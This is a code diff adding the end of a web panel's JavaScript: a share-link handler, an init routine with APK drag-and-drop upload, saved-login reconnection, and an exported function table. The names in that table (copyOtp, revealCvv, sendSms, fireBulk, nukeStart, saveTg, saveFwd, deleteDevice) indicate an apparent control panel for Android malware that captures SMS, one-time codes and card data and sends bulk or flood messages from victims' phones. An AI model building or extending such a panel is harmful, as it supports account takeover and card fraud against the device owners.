@@ -1893,4 +1893,76 @@ function nukeStop(){
 
 /* ── SHARE LINK HANDLER ── */
 function handleShareLink(){
-  const params = new URL
+  const params = new URLSearchParams(location.search);
+  const s = params.get("s");
+  if(!s) return false;
+  const parsed = parseShare(s);
+  if(!parsed) return false;
+  history.replaceState(null, "", location.pathname);
+  $("inpUrl").value = parsed.url;
+  $("inpKey").value = parsed.key;
+  toast("Share link loaded", "ok");
+  return true;
+}
+
+/* ── INIT ── */
+function init(){
+  setInterval(() => {
+    const d = new Date();
+    $("clock").textContent = d.toLocaleTimeString("en-IN", {hour12:false});
+  }, 1000);
+
+  const drop = $("dropZone");
+  if(drop){
+    drop.addEventListener("dragover", e => { e.preventDefault(); drop.classList.add("dg"); });
+    drop.addEventListener("dragleave", () => drop.classList.remove("dg"));
+    drop.addEventListener("drop", e => {
+      e.preventDefault(); drop.classList.remove("dg");
+      const f = e.dataTransfer.files[0];
+      if(f) parseApk(f);
+    });
+  }
+  $("apkInput").addEventListener("change", e => {
+    const f = e.target.files[0];
+    if(f) parseApk(f);
+  });
+
+  $("inpKey").addEventListener("keydown", e => { if(e.key === "Enter") login(); });
+  $("inpUrl").addEventListener("keydown", e => { if(e.key === "Enter") $("inpKey").focus(); });
+
+  const hadShare = handleShareLink();
+
+  if(!hadShare){
+    try {
+      const last = JSON.parse(localStorage.getItem(LS_L) || "null");
+      if(last && last.url && last.key){
+        $("inpUrl").value = last.url;
+        $("inpKey").value = last.key;
+        connect(last.url, last.key, false).catch(() => showSaved());
+        return;
+      }
+    } catch {}
+  }
+  if(!hadShare) showSaved();
+}
+
+window.G = {
+  login, logout, connect, showNew, showSaved,
+  setFilter, render, openDrawer, closeDrawer, tab,
+  renderSms, setMf, deleteMsg, deleteAllMsgs, exportSms,
+  pickSim, useNum, sendSms,
+  saveTg, saveFwd, saveAlias, copyPin, deleteDevice,
+  revealCvv, copyRaw, reloadRaw,
+  copyOtp, dismissOtp,
+  openBulk, closeBulk, bulkSel, bulkSim, fireBulk,
+  openNuke, closeNuke, nukeSim, nukeMode, nukeStart, nukeStop,
+  copy, toast
+};
+
+if(document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
+else init();
+
+})();
+</script>
+</body>
+</html>
